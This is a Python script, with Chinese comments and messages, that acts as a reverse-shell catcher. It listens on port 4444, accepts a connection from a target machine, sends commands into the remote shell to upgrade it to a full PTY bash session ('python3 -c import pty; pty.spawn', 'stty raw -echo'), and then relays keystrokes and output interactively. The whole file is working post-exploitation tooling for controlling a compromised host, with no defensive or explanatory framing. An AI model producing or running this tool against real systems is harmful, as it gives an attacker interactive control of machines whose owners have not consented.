import socket
import time
import sys
import select
import termios
import tty
import os


def start_listener(port):
    print(f"[*] 正在监听{config['LHOST']}:{port}...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((config["LHOST"], port))
    server.listen(1)

    conn, addr = server.accept()
    config['TARGET_IP'] = addr[0]
    print(f"[+] 收到来自 {addr[0]} 的反弹 Shell 连接！")
    return conn


def upgrade_to_pty(conn):
    print("[*] 正在尝试升级伪终端...")
    conn.send(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
    conn.send(b"export TERM=xterm-256color\n")
    conn.send(b"stty raw -echo\n")
    columns, rows = os.get_terminal_size()
    SizeNumber = f"stty rows {rows} columns {columns}\n"
    conn.send(SizeNumber.encode())
    conn.send(b"reset\n")
    time.sleep(1)
    conn.send(b"clear\n")
    return


def interactive_shell(conn):
    print("[*] 已成功接收反弹 Shell，进入交互模式。")
    old_tty = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        while True:
            sockets = [conn, sys.stdin]
            readable, _, _ = select.select(sockets, [], [])
            for sock in readable:
                if sock == conn:
                    data = conn.recv(10240)
                    if not data:
                        print("[-] 连接断开。")
                        return
                    sys.stdout.write(data.decode())
                    sys.stdout.flush()
                else:
                    user_input = sys.stdin.read(1)
                    conn.send(user_input.encode())
    finally:
        # 恢复终端设置
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
    return


def main():
    global config
    global conn
    config = {
        'LHOST': '0.0.0.0',  # 设置监听主机
        'PORT': 4444,  # 设置监听端口
    }

    try:
        conn = start_listener(config['PORT'])
        upgrade_to_pty(conn)
        interactive_shell(conn)
    except Exception as e:
        print(f"{e}")


if __name__ == "__main__":
    main()
